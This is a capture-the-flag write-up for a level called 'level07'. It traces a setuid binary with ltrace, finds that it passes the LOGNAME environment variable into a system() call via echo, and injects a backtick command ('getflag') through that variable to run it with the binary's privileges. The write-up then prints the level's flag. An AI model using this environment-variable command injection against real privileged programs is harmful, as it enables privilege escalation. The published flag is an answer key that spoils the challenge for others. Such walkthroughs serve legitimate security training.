## level07
1. We are given `level07` binary executable, output when launched: "level07"
2. Check the inner system calls
```
$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff6e4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                = 2007
geteuid()                                                = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)      = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)      = 0
getenv("LOGNAME")                                        = "level07"
asprintf(0xbffff634, 0x8048688, 0xbfffff3a, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                   = 0
+++ exited (status 0) +++
```
3. Environmental variable `LOGNAME` contains "level07" text, and `echo` prints it on screen. Therefore if swap containing of `LOGNAME` with shell command in backticks, it will be executed by echo
``` Bash
export LOGNAME=\`getflag\`
```
4. Launching `./level07` results to flag for level08: **fiumuikeil55xe9cu4dood66h**

### [< PREVIOUS LEVEL](../../level06/Resources/stages.md) | [NEXT LEVEL >](../../level08/Resources/stages.md)
### [MAIN MENU](../../README.md)

